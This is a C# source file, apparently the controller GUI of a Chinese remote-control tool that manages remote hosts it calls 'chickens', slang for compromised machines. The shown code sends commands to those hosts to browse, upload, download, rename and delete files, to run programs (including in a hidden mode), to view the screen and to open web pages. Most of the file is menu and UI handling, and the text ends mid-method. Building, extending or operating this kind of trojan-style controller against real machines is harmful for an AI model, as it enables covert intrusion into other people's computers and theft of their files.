/******************************************
 * 版权所有jackch
 * QQ:106050555
 * E-mail:jackch88@hotmail.com
 * 个人Blog:http://www.jackch.cn
 * CSDN_Blog:http://blog.csdn.net/jackch88/
 * ****************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Collections;
using Jackch;
using FarsiLibrary.Win;

namespace Jackch
{
    public partial class MainForm : Form
    {
        public MainForm()
        {
            InitializeComponent();
        }

        [System.Runtime.InteropServices.DllImport("user32")]
        private static extern bool AnimateWindow(IntPtr hwnd, int dwTime, int dwFlags);
        const int AW_HOR_POSITIVE = 0x0001;
        const int AW_HOR_NEGATIVE = 0x0002;
        const int AW_VER_POSITIVE = 0x0004;
        const int AW_VER_NEGATIVE = 0x0008;
        const int AW_CENTER = 0x0010;
        const int AW_HIDE = 0x10000;
        const int AW_ACTIVATE = 0x20000;
        const int AW_SLIDE = 0x40000;
        const int AW_BLEND = 0x80000;		

        [DllImport("shell32")]
        private static extern int SHGetFileInfo(string pszPath, int dwFileAttributes, ref SHFILEINFO psfi, int cbFileInfo, int uFlags);
        const int SHGFI_ICON = 0x0100;
        const int SHGFI_LARGEICON = 0x0000;

        private static bool cls = false;
        private Font myFont;
            
        private void MainForm_Load(object sender, System.EventArgs e)//窗体装载
        {
            //初始化文件管理
            InitFile();
            //本地IP
            string myIP = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
            textBox1.Text = "LocalHost(127.0.0.1)";
            statusBarPanel1.Text += myIP;
            
            //初始化网络
            InitSocket();
            //托盘图标
            notifyIcon1.Icon = this.Icon;
            notifyIcon1.Text = "TwoCare远程管理";
            notifyIcon1.ContextMenu = this.contextMenu1;
            notifyIcon1.Visible = true;
            //初始化界面
            //AnimateWindow(this.Handle, 1000, AW_CENTER | AW_ACTIVATE); 

            //初始化字体
            myFont = new System.Drawing.Font("Comic Sans", 11);
            System.Reflection.MemberInfo[] pro = typeof(System.Drawing.Color).GetProperties();
            ArrayList arr = new ArrayList();
        
            for (int i = 0; i < 141; ++i)
            {
                arr.Add(pro[i].Name);
            }
            this.comboBox8.DataSource = arr;
            this.comboBox8.Text = "Red";	
        }
        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)//窗体关闭事件
        {
            if (cls)
            {
                try
                {
                    thread.Abort();
                    listener.Stop();
                    threadConnected.Abort();
                    threadTrans.Abort();
                    //socket.Close();
                    foreach (Chicken chicken in chickens)
                    {
                        chicken.Close();
                    }
                    e.Cancel = false;

                }
                catch { }
            }
            else
            {
                e.Cancel = true;
                this.Visible = false;
            }
            //AnimateWindow(this.Handle, 1000, AW_HIDE | AW_SLIDE | AW_VER_NEGATIVE);
            
        }

        private void cxMenuItemExit_Click(object sender, EventArgs e)
        {
            cls = true; 
            this.Close();
            
        }

        private void cxMenuItemOpen_Click(object sender, EventArgs e)
        {
            this.Visible = true;
            //AnimateWindow(this.Handle, 1000, AW_CENTER | AW_ACTIVATE);
        }

        private void menuItemZhuYe_Click(object sender, EventArgs e)
        {
            Jackch.Cmd.RunIE("http://www.billgates.org.cn");

        }

        private void menuItemAbout_Click(object sender, EventArgs e)
        {
            using (AboutForm f = new AboutForm())
            {
                f.ShowDialog();
            }
        }

        private void toolBar1_ButtonClick(object sender, ToolBarButtonClickEventArgs e)
        {
            if (e.Button == toolBarButton10)
            {
                using (AboutForm f = new AboutForm())
                {
                    f.ShowDialog();
                }
            }
            else if (e.Button == toolBarButton7)
            {
                using (CmdForm f = new CmdForm())
                {
                    f.ShowDialog();
                }
            }
            else if (e.Button == toolBarButton4)
            {
                VideoForm f = new VideoForm();
                f.Show();
                
            }
            else if (e.Button == toolBarButton3)
            {
                if (isLocal)
                {
                    MessageBox.Show("请先连接远程主机","提示");
                    return;
                }
                command = "ViewScreen";
                chickens.CurrentChicken.WriteToServer(command);
                using (ScreenForm f = new ScreenForm())
                {
                    f.ShowDialog();
                }

            }
        }

        private void menuItemExit_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void menuItemToolBar_Click(object sender, EventArgs e)
        {
            if (menuItemToolBar.Checked == false)
            {
                menuItemToolBar.Checked = true;
                toolBar1.Visible = true;
            }
            else
            {
                menuItemToolBar.Checked = false;
                toolBar1.Visible = false;
            }
        }
        /// <summary>
        /// 显示方式更改
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem5_Click(object sender, EventArgs e)
        {
            this.contextMenu2.MenuItems[0].Checked = true;
            this.contextMenu2.MenuItems[1].Checked = false;
            this.contextMenu2.MenuItems[2].Checked = false;
            this.contextMenu2.MenuItems[3].Checked = false;
            this.listViewFile.View = View.LargeIcon;
        }

        private void menuItem6_Click(object sender, EventArgs e)
        {
            this.contextMenu2.MenuItems[0].Checked = false;
            this.contextMenu2.MenuItems[1].Checked = true;
            this.contextMenu2.MenuItems[2].Checked = false;
            this.contextMenu2.MenuItems[3].Checked = false;
            this.listViewFile.View = View.SmallIcon;
        }

        private void menuItem7_Click(object sender, EventArgs e)
        {
            this.contextMenu2.MenuItems[0].Checked = false;
            this.contextMenu2.MenuItems[1].Checked = false;
            this.contextMenu2.MenuItems[2].Checked = true;
            this.contextMenu2.MenuItems[3].Checked = false;
            this.listViewFile.View = View.List;
        }

        private void menuItem8_Click(object sender, EventArgs e)
        {
            this.contextMenu2.MenuItems[0].Checked = false;
            this.contextMenu2.MenuItems[1].Checked = false;
            this.contextMenu2.MenuItems[2].Checked = false;
            this.contextMenu2.MenuItems[3].Checked = true;
            this.listViewFile.View = View.Details;
        }
        /// <summary>
        /// 打开官方网站
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Jackch.Cmd.RunIE("http://www.billgates.org.cn");
        }
        private void notifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            cxMenuItemOpen_Click(null, null);
        }

        private void button33_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            Jackch.Cmd.RunFile("MyDesktop.scf");
        }

        //***************************************************************************** 
        /// <summary>
        /// 文件列表右键显示菜单
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        #region private void contextMenu3_Popup(object sender, EventArgs e)
        private void contextMenu3_Popup(object sender, EventArgs e)
        {
            if (isLocal)
            {
                this.menuItem9.Enabled = false;
                this.menuItem14.Enabled = false;
                this.menuItem15.Enabled = false;
                this.menuItem16.Enabled = false;
                this.menuItem17.Enabled = false;
                
                
                if (fileName == "")
                {
                    if (listViewFile.FocusedItem == null)
                    {
                        this.menuItem10.Enabled = false;
                        this.menuItem12.Enabled = true;
                        this.menuItem19.Enabled = false;
                        this.menuItem23.Enabled = false;
                        this.menuItem24.Enabled = false;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                    else
                    {
                        this.menuItem10.Enabled = true;
                        this.menuItem12.Enabled = true;
                        this.menuItem19.Enabled = false;
                        this.menuItem23.Enabled = false;
                        this.menuItem24.Enabled = false;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                }
                else
                {
                    if (listViewFile.FocusedItem == null)
                    {
                        this.menuItem10.Enabled = false;
                        this.menuItem12.Enabled = true;
                        this.menuItem19.Enabled = true;
                        this.menuItem23.Enabled = false;
                        this.menuItem24.Enabled = false;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                    else
                    {
                        this.menuItem10.Enabled = true;
                        this.menuItem12.Enabled = true;
                        this.menuItem19.Enabled = true;
                        this.menuItem23.Enabled = true;
                        this.menuItem24.Enabled = true;
                        this.menuItem25.Enabled = true;
                        this.menuItem27.Enabled = true;
                        if (listViewFile.FocusedItem.SubItems.Count > 1)
                        {
                            this.menuItem28.Enabled = true;
                        }
                        else
                        {
                            this.menuItem28.Enabled = false;
                        }
                    }
                }
            }
            else
            {
                this.menuItem10.Enabled = false;
                this.menuItem23.Enabled = false;
                this.menuItem24.Enabled = false;
                if (fileName == "")//磁盘目录
                {
                    if (listViewFile.FocusedItem == null)
                    {
                        this.menuItem9.Enabled = false;
                        this.menuItem12.Enabled = true;
                        this.menuItem14.Enabled = false;
                        this.menuItem15.Enabled = false;
                        this.menuItem16.Enabled = false;
                        this.menuItem17.Enabled = false;
                        this.menuItem19.Enabled = false;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                    else
                    {
                        this.menuItem9.Enabled = true;
                        this.menuItem12.Enabled = true;
                        this.menuItem14.Enabled = false;
                        this.menuItem15.Enabled = false;
                        this.menuItem16.Enabled = false;
                        this.menuItem17.Enabled = false;
                        this.menuItem19.Enabled = false;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                }
                else
                {
                    if (listViewFile.FocusedItem == null)//没有选种文件或文件夹
                    {
                        this.menuItem9.Enabled = false;
                        this.menuItem12.Enabled = true;
                        this.menuItem14.Enabled = true;
                        this.menuItem15.Enabled = false;
                        this.menuItem16.Enabled = true;
                        this.menuItem17.Enabled = false;
                        this.menuItem19.Enabled = true;
                        this.menuItem25.Enabled = false;
                        this.menuItem27.Enabled = false;
                        this.menuItem28.Enabled = false;
                    }
                    else
                    {
                        this.menuItem9.Enabled = true;
                        this.menuItem12.Enabled = true;
                        this.menuItem14.Enabled = true;
                        this.menuItem16.Enabled = true;
                        this.menuItem19.Enabled = true;
                        this.menuItem25.Enabled = true;
                        this.menuItem27.Enabled = true;
                        if (listViewFile.FocusedItem.SubItems.Count > 1)
                        {
                            this.menuItem15.Enabled = true;
                            this.menuItem17.Enabled = false;
                            this.menuItem28.Enabled = true;
                        }
                        else
                        {
                            this.menuItem15.Enabled = false;
                            this.menuItem17.Enabled = true;
                            this.menuItem28.Enabled = false;
                        }
                    }
                }
            }
        }
        #endregion 

        #region 工具栏相关文件操作
        /// <summary>
        /// 显示隐藏树视表
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton0_Click(object sender, EventArgs e)
        {
            if (!this.splitContainer1.Panel1Collapsed)
            {
                this.splitContainer1.Panel1Collapsed = true;
                toolStripButton0.Image = AllImageList.Images[16];
                toolStripButton0.ToolTipText = "显示";
            }
            else
            {
                this.splitContainer1.Panel1Collapsed = false;
                toolStripButton0.Image = AllImageList.Images[15];
                toolStripButton0.ToolTipText = "隐藏";
            }
        }
        /// <summary>
        /// 新建文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            if (isLocal)
            {
                string str = Path.Combine(fileName, "新建文件");
                try
                {
                    File.Create(str);
                }
                catch { }
            }
            else
            {
                string str = Path.Combine(fileName, "新建文件");
                command = "Mkfile " + str;
                if (!chickens.CurrentChicken.WriteToServer(command))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,新建文件失败";
                    return;
                }
                bool isConnected = true;
                string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,新建文件失败";
                    return;
                }
            }
            RefDir();
        }
        /// <summary>
        /// 新建文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            if (isLocal)
            {
                string str = Path.Combine(fileName, "新建文件夹");
                try
                {
                    Directory.CreateDirectory(str);
                }
                catch { }
            }
            else
            {
                string str = Path.Combine(fileName, "新建文件夹");
                command = "Mkdir " + str;
                if (!chickens.CurrentChicken.WriteToServer(command))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,新建文件夹";
                    return;
                }
                bool isConnected = true;
                string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,新建文件夹";
                    return;
                }
            }
            RefDir();
        }
        /// <summary>
        /// 复制本地文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton3_Click(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// 粘贴本地文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton4_Click(object sender, EventArgs e)
        {

        }
        /// <summary>
        /// 删除文件或文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            if (listViewFile.FocusedItem == null)
            {
                MessageBox.Show("请选择你要删除的文件", "提示");
                return;
            }
            try
            {
                string s = "";
                if (listViewFile.FocusedItem.SubItems.Count > 1)
                    s = "确实要删除文件:" + listViewFile.FocusedItem.Text.ToString();
                else
                    s = "确实要删除文件夹:" + listViewFile.FocusedItem.Text.ToString();
                if (MessageBox.Show(s,"确认删除操作",MessageBoxButtons.OKCancel,MessageBoxIcon.Information) == DialogResult.Cancel)
                    return;
                string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
                if (listViewFile.FocusedItem.SubItems.Count > 1)
                    DeleteFile(str);
                else
                    DeleteDir(str);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString(), "提示");
            }
        }
        /// <summary>
        /// 上传文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            if (isLocal || fileName=="")
                return;
            OpenFileDialog of = new OpenFileDialog();
            if (of.ShowDialog() == DialogResult.OK)
            {
                FileInfo f = new FileInfo(of.FileName);
                string str = Path.Combine(fileName, f.Name);

                chickensTrans.AddChicken(chickens.CurrentChicken);

                ListViewItem lv = new ListViewItem("",5);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = chickens.CurrentChicken.IP.ToString(); 
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = of.SafeFileName;
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = of.FileName;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = str;
                
                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[]{s0,s1,s2,s3});
                listView9.Items.Add(lv);//.Insert(0, lv);
                this.tabControl1.SelectedTab = this.tabPage9;
                
            }
        }
        /// <summary>
        /// 下载文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton7_Click(object sender, EventArgs e)
        {
            if (isLocal ||listViewFile.FocusedItem == null|| listViewFile.FocusedItem.SubItems.Count <=1)
                return;
            SaveFileDialog sf = new SaveFileDialog();
            sf.FileName = listViewFile.FocusedItem.Text.ToString();
            if (sf.ShowDialog() == DialogResult.OK)
            {
                string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
                
                chickensTrans.AddChicken(chickens.CurrentChicken);
                ListViewItem lv = new ListViewItem("", 6);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = chickens.CurrentChicken.IP.ToString();
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = listViewFile.FocusedItem.Text;
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = sf.FileName;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = str;
                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s0, s1, s2, s3 });
                listView9.Items.Add(lv);//.Insert(0, lv);
                this.tabControl1.SelectedTab = this.tabPage9;
            }
        }
        /// <summary>
        /// 上传文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton8_Click(object sender, EventArgs e)
        {
            if (isLocal||fileName == "")
                return;
            FolderBrowserDialog of = new FolderBrowserDialog();
            if (of.ShowDialog() == DialogResult.OK)
            {
                dir = new DirectoryInfo(of.SelectedPath);
                string str = Path.Combine(fileName, dir.Name);

                chickensTrans.AddChicken(chickens.CurrentChicken);
                ListViewItem lv = new ListViewItem("", 7);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = chickens.CurrentChicken.IP.ToString();
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = dir.Name;
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = of.SelectedPath;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = str;
                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s0, s1, s2, s3});
                listView9.Items.Add(lv);//.Insert(0, lv);
                this.tabControl1.SelectedTab = this.tabPage9;
            }
        }
        /// <summary>
        /// 下载文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton9_Click(object sender, EventArgs e)
        {
            if (isLocal || listViewFile.FocusedItem == null || listViewFile.FocusedItem.SubItems.Count > 1)
                return;
            FolderBrowserDialog of = new FolderBrowserDialog();
            if (of.ShowDialog() == DialogResult.OK)
            {
                dir = new DirectoryInfo(of.SelectedPath);
                string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
                
                chickensTrans.AddChicken(chickens.CurrentChicken);
                ListViewItem lv = new ListViewItem("", 8);
                ListViewItem.ListViewSubItem s0 = new ListViewItem.ListViewSubItem();
                s0.Text = chickens.CurrentChicken.IP.ToString();
                ListViewItem.ListViewSubItem s1 = new ListViewItem.ListViewSubItem();
                s1.Text = listViewFile.FocusedItem.Text;
                ListViewItem.ListViewSubItem s2 = new ListViewItem.ListViewSubItem();
                s2.Text = of.SelectedPath + @"\" + listViewFile.FocusedItem.Text;
                ListViewItem.ListViewSubItem s3 = new ListViewItem.ListViewSubItem();
                s3.Text = str;
                lv.SubItems.AddRange(new ListViewItem.ListViewSubItem[] { s0, s1, s2, s3 });
                listView9.Items.Add(lv);//.Insert(0, lv);
                this.tabControl1.SelectedTab = this.tabPage9;
            }
        }
        /// <summary>
        /// 重命名文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton10_Click(object sender, EventArgs e)
        {
            if (listViewFile.FocusedItem == null)
            {
                MessageBox.Show("请选择你要重命名的文件", "提示");
                return;
            }
            RenameForm rf = new RenameForm();
            rf.textBox1.Text = listViewFile.FocusedItem.Text.ToString();
            rf.textBox2.Text = listViewFile.FocusedItem.Text.ToString();
            if (rf.ShowDialog() == DialogResult.Cancel)
                return;
            string str1 = Path.Combine(fileName, rf.textBox1.Text);
            string str2 = Path.Combine(fileName, rf.textBox2.Text);
            if (str1 == str2)
                return;
            if (isLocal)
            {
                File.Copy(str1, str2, true);
                File.Delete(str1);
            }
            else
            {
                command = "Rename " + str1 + "\r" + str2;
                if(!chickens.CurrentChicken.WriteToServer(command))
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,重命名文件失败";
                    return;
                }
                bool isConnected = true;
                string str = chickens.CurrentChicken.ReadFromServer(out isConnected);
                if (!isConnected)
                {
                    statusBarPanel2.Text = "远程主机没有连接或已断开连接,重命名文件失败";
                    return;
                }
            }
            RefDir();
        }
        /// <summary>
        /// 刷新文件列表
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton11_Click(object sender, EventArgs e)
        {
            RefDir();
        }
        /// <summary>
        /// 后退
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton12_Click(object sender, EventArgs e)
        {
            int n = fileName.LastIndexOf("\\");
            if (fileName.Length == 3)//磁盘符目录
            {
                GetDriverList();
            }
            else if (n != -1)
            {
                if (n <= 2)
                    n = 3;
                fileName = fileName.Substring(0, n);
                InitList2(fileName);
            }
        }
        /// <summary>
        /// 显示方式
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void 大图标ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.大图标ToolStripMenuItem.Checked = true;
            this.小图标ToolStripMenuItem.Checked = false;
            this.列表ToolStripMenuItem.Checked = false;
            this.详细资源ToolStripMenuItem.Checked = false;
            this.listViewFile.View = View.LargeIcon;
        }

        private void 小图标ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.大图标ToolStripMenuItem.Checked = false;
            this.小图标ToolStripMenuItem.Checked = true;
            this.列表ToolStripMenuItem.Checked = false;
            this.详细资源ToolStripMenuItem.Checked = false;
            this.listViewFile.View = View.SmallIcon;
        }

        private void 列表ToolStripMenuItem_Click(object sender, EventArgs e)
        {

            this.大图标ToolStripMenuItem.Checked = false;
            this.小图标ToolStripMenuItem.Checked = false;
            this.列表ToolStripMenuItem.Checked = true;
            this.详细资源ToolStripMenuItem.Checked = false;
            this.listViewFile.View = View.List;
        }
        private void 详细资源ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.大图标ToolStripMenuItem.Checked = false;
            this.小图标ToolStripMenuItem.Checked = false;
            this.列表ToolStripMenuItem.Checked = false;
            this.详细资源ToolStripMenuItem.Checked = true;
            this.listViewFile.View = View.Details;
        }
        private void toolStripButton22_Click(object sender, EventArgs e)
        {
            string s = this.toolStripComboBox1.Text;
            s = s.TrimStart(' ');
            s = s.TrimEnd(' ');
            if (s == ""||s=="我的电脑")
                GetDriverList();
            else
                InitList2(s);
        }
        #endregion
        //*****************************************************************************
        /// <summary>
        /// 本地打开
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem10_Click(object sender, EventArgs e)
        {
            listViewFile_ItemActivate(sender,e);
        }
        /// <summary>
        /// 刷新文件列表
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem12_Click(object sender, EventArgs e)
        {
            toolStripButton11_Click(sender, e);
        }
        /// <summary>
        /// 远程打开预处理
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem9_Popup(object sender, EventArgs e)
        {
            if (listViewFile.FocusedItem.SubItems.Count > 1)
                this.menuItem34.Enabled = true;
            else
                this.menuItem34.Enabled = false;
        }
        /// <summary>
        /// 远程打开
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem29_Click(object sender, EventArgs e)
        {
            if (isLocal)
                return;
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            if(!chickens.CurrentChicken.WriteToServer("Run "+str))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
            bool isConnected = true;
            string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
        }

        private void menuItem30_Click(object sender, EventArgs e)
        {
            if (isLocal)
                return;
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            if(!chickens.CurrentChicken.WriteToServer("Run " + str+"\rhidden"))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
            bool isConnected = true;
            string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
        }

        private void menuItem31_Click(object sender, EventArgs e)
        {
            if (isLocal)
                return;
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            if(!chickens.CurrentChicken.WriteToServer("Run " + str + "\rmin"))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
            bool isConnected = true;
            string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
        }

        private void menuItem32_Click(object sender, EventArgs e)
        {
            if (isLocal)
                return;
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            if(!chickens.CurrentChicken.WriteToServer("Run " + str + "\rmax"))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
            bool isConnected = true;
            string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
        }

        private void menuItem34_Click(object sender, EventArgs e)
        {
            if (isLocal)
                return;
            RunCommandForm rcf = new RunCommandForm();
            rcf.textBox1.Text = listViewFile.FocusedItem.Text;
            if (rcf.ShowDialog() == DialogResult.Cancel)
                return;
            string str = Path.Combine(fileName, listViewFile.FocusedItem.Text);
            if(!chickens.CurrentChicken.WriteToServer("Run " + str + "\rcanshu\r" + rcf.textBox2.Text))
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
            bool isConnected = true;
            string ss = chickens.CurrentChicken.ReadFromServer(out isConnected);
            if (!isConnected)
            {
                statusBarPanel2.Text = "远程主机没有连接或已断开连接,远程打开文件失败";
                return;
            }
        }
        /// <summary>
        /// 文件上传
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem14_Click(object sender, EventArgs e)
        {
            toolStripButton6_Click(sender, e);
        }
        /// <summary>
        /// 文件下载
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem15_Click(object sender, EventArgs e)
        {
            toolStripButton7_Click(sender, e);
        }
        /// <summary>
        /// 文件夹上传
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem16_Click(object sender, EventArgs e)
        {
            toolStripButton8_Click(sender, e);
        }
        /// <summary>
        /// 文件夹下载
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem17_Click(object sender, EventArgs e)
        {
            toolStripButton9_Click(sender, e);
        }
        /// <summary>
        /// 新建文件夹
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem20_Click(object sender, EventArgs e)
        {
            toolStripButton2_Click(sender, e);
        }
        /// <summary>
        ///  新建文件
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem21_Click(object sender, EventArgs e)
        {
            toolStripButton1_Click(sender, e);
        }
        /// <summary>
        /// 复制
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem23_Click(object sender, EventArgs e)
        {
            toolStripButton3_Click(sender, e);
        }
        /// <summary>
        /// 粘贴
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem24_Click(object sender, EventArgs e)
        {
            toolStripButton4_Click(sender, e);
        }
        /// <summary>
        /// 删除
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem25_Click(object sender, EventArgs e)
        {
            toolStripButton5_Click( sender,  e);
        }
        /// <summary>
        /// 重命名
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem27_Click(object sender, EventArgs e)
        {
            toolStripButton10_Click(sender, e);
        }
        /// <summary>
        /// 属性
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem28_Click(object sender, EventArgs e)
        {
            string fn = "文件名称：" + listViewFile.FocusedItem.Text.ToString();
            string fs = "文件大小：" + listViewFile.FocusedItem.SubItems[1].Text;
            string fc = "创建时间：" + listViewFile.FocusedItem.SubItems[2].Text;
            string fr = "修改时间：" + listViewFile.FocusedItem.SubItems[3].Text;
            string str = fn + "\r\n" + fs + "\r\n" + fc + "\r\n" + fr;
            MessageBox.Show(str,"文件属性",MessageBoxButtons.OK,MessageBoxIcon.Information);
        }
        /// <summary>
        /// 后退
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void menuItem35_Click(object sender, EventArgs e)
        {
            toolStripButton12_Click(sender, e);
        }



        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                foreach (ListViewItem lv in listView1.Items)
                {
                    lv.Checked = true;
                }
            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            foreach (ListViewItem lv in listView1.Items)
            {
                lv.Checked = !(lv.Checked);
            }
        }

        private void checkBox5_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox5.Checked)
            {
                foreach (ListViewItem lv in listView1.Items)
                {
                    if (lv.SubItems[4].Text.IndexOf(comboBox2.Text)!=-1)
                        lv.Checked = true;
                    else
                        lv.Checked = false;
                }
            }
        }

        private void 断点续传ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            断点续传ToolStripMenuItem.Checked = true;
            覆盖模式ToolStripMenuItem.Checked = false;
        }

        private void 覆盖模式ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            断点续传ToolStripMenuItem.Checked = false;
            覆盖模式ToolStripMenuItem.Checked = true;
        }

        private void toolStripButton33_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < this.listView9.SelectedItems.Count; ++i)
            {
                this.listView9.Items.RemoveAt(listView9.SelectedItems[i].Index);
            }
        }
        /// <summary>
        /// 远程控制
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void toolStripButton_Click(object sender, EventArgs e)
        {
            string returnString = null;
            CommentSend(sender.ToString(), sender.ToString(), out returnString);
        }

        private void button6_Click(object sender, EventArgs e)
        {
            command = "openie " + textBox9.Text + "\n" + textBox10.Text + "\n" + checkBox3.Checked.ToString();
            string returnString = null;
            CommentSend("打开网页", command, out returnString);
        }

        private void button7_Click(object sender, EventArgs e)
